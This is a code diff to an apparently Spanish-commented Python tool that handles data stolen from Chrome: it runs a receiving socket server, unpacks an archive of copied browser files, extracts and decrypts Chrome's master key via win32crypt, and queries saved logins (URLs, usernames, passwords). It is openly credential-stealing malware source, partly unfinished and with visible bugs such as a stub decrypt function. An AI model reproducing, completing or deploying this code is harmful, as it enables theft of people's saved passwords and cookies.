@@ -1,13 +1,18 @@
 import sqlite3
 import os
+import json
+import base64
+import win32crypt
+import Sockets.sckt_server as server
 import shutil
 
+#pip install pypiwin32
 
 # Enviar de client a server , haciendo que en el serve se guarden en x sitio.
 
 BasePath = "Data/"
 
-COPY_PATH = {
+PATH = {
     "CHROME_LOCAL_STATE_FILE_PATH": BasePath + "Chrome_Local_State",
     "CHROME_PASSWORDS_DB_PATH": BasePath + "Chrome_Login_Data",
     "CHROME_COOKIES_DB_PATH": BasePath + "Chrome_Cookies",
@@ -32,31 +37,84 @@ SQL = {
 }
 
 def get_db_data(file,command,master_key=None):
-    con = sqlite3.connect(COPY_PATH[file])
+    con = sqlite3.connect(PATH[file])
     cursor = con.cursor()
     cursor.execute(SQL[command])
     data = cursor.fetchall()
 
     return data
 
+def run_server():
+    server.server()
+
+def unpack():
+    return shutil.unpack_archive("Data123963.zip", "Data/")
+
+def master_Key():
+    with open(PATH["CHROME_LOCAL_STATE_FILE_PATH"], "r") as f:
+        local_state = f.read()
+        local_state_json = json.load(local_state)
+    master_Key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_Key = master_Key[5:]
+    master_Key = win32crypt.CryptUnprotectData(master_Key,None,None,None,0)[1]
+
+    return master_Key
+
+def decrypt_pass():
+    pass
+
+def pass_chrome():
+    #cnn = sqlite3.connect(os.getenv('localappdata')+ r'\\Google\\Chrome\\User Data\\Default\\Login Data')
+    cnn=sqlite3.connect(PATH["CHROME_PASSWORDS_DB_PATH"])
+    cnn1 = sqlite3.connect("chrome_pass.db")
+    cursor = cnn.cursor()
+    cursor1 = cnn1.cursor()
+    try:
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        cursor1.execute('''CREATE TABLE passwords(url, username, password)''')
+        print(master_Key())
+        """
+        for i in cursor.fetchall():
+            print(master_Key())
+        """
+    except Exception as e:
+        pass
+    finally:
+        cursor.close()
+        cnn.close()
+
 def main():
+    options = {1: run_server,
+               2: unpack,
+               3: pass_chrome,
+               4: master_Key,
+        }
 
+    while True:
+        print("1. Run Server")
+        print("2. Unpack Data")
+        print("3. Decrypt Chrome Passwrds and Generate a DB")
+        print("4. Decrypt Edge Passwrds and Generate a DB")
+        print("5. Decrypt OperaGX Passwrds and Generate a DB")
 
-
-    shutil.unpack_archive("Data123963.zip", "Data/")
+        x = int(input())
+        if x != 5:
+            options[x]()
+        else:
+            break
 
 
 
     """
-    get_master_key(TARGET_FILE_PATH["CHROME_LOCAL_STATE_FILE_PATH"], master_key_path)
+    get_master_key(PATH["CHROME_LOCAL_STATE_FILE_PATH"], master_key_path)
      for file_path in TARGET_FILE_PATH:
     """
 
-
+    """"
     x = get_db_data("CHROME_HISTORY_DB_PATH","HISTORY_SQL")
     for i in x:
         print(i)
-
+    """
 
 
 if __name__ == "__main__":
